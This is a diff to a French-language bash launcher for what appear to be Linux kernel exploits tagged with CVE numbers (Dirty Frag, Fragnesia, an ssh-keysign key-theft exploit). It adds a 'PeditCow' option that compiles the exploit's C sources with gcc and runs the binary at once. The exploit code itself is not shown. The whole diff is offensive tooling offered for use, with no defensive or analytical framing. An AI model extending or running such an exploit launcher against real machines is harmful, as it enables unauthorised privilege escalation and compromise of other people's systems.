@@ -40,6 +40,7 @@ if [[ "$*" == "-help" ]]; then
      echo "   -DirtyFrag     Dirty Frag - CVE-2026-43284"
      echo "   -Fragnesia     Fragnesia - CVE-2026-46300"
      echo "   -DirtyDecrypt  pwn-key-ssh & chage - CVE-2026-31635"
+     echo "   -PeditCow      PeditCow - CVE-2026-46331"
      echo " "
      echo "Cmds:"
      echo "   -check         Verifie si gcc est installer"
@@ -154,3 +155,11 @@ if [[ "$*" == "-DirtyDecrypt" ]]; then
      echo "-------------------------"
      ${PWD}/exploit/ssh-keysign-pwn
 fi
+
+# PeditCow
+if [[ "$*" == "-PeditCow" ]]; then
+     gcc -O2 -Wall -static ${PWD}/exploits/PeditCow/packet_edit_meme.c ${PWD}/exploits/PeditCow/pedit_primitive.c      
+     echo "[+] Compilation successfuly !"
+     echo "[+] PATH=${PWD}/exploits/PeditCow/a.out"
+     echo "[+] Executing the binary..."
+     ${PWD}/exploits/PeditCow/a.out
